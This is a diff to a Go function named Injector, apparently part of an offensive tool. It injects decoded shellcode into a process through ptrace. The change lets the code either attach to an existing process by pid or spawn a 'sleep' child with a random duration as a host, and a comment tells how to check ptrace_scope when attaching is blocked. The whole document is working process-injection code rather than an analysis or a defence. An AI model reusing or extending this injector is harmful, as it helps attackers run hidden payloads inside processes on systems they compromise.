@@ -212,12 +212,33 @@ func Injector(pid int, shellcode *string) error {
 		return fmt.Errorf("Decode shellcode: %v", err)
 	}
 
-	// start a child process to inject shellcode into
-	err = syscall.PtraceAttach(pid)
-	if err != nil {
-		return fmt.Errorf("ptrace attach: %v", err)
+	// inject to an existing process or start a new one
+	// check /proc/sys/kernel/yama/ptrace_scope if you cant inject to existing processes
+	if pid == 0 {
+		// start a child process to inject shellcode into
+		sec := strconv.Itoa(RandInt(10, 30))
+		child := exec.Command("sleep", sec)
+		child.SysProcAttr = &syscall.SysProcAttr{Ptrace: true}
+		err = child.Start()
+		if err != nil {
+			return fmt.Errorf("Start `sleep %s`: %v", sec, err)
+		}
+		pid = child.Process.Pid
+
+		// attach
+		err = child.Wait() // TRAP the child
+		if err != nil {
+			log.Printf("child process wait: %v", err)
+		}
+		log.Printf("Injector: attached to child process (%d)", pid)
+	} else {
+		// start a child process to inject shellcode into
+		err = syscall.PtraceAttach(pid)
+		if err != nil {
+			return fmt.Errorf("ptrace attach: %v", err)
+		}
+		log.Printf("Injector: attached to %d", pid)
 	}
-	log.Printf("Injector: attached to %d", pid)
 
 	// read RIP
 	regs := &syscall.PtraceRegs{}
@@ -253,6 +274,7 @@ func Injector(pid int, shellcode *string) error {
 	if err != nil {
 		return fmt.Errorf("continue: wait4: %v", err)
 	}
+
 	// what happened to our child?
 	switch {
 	case ws.Continued():
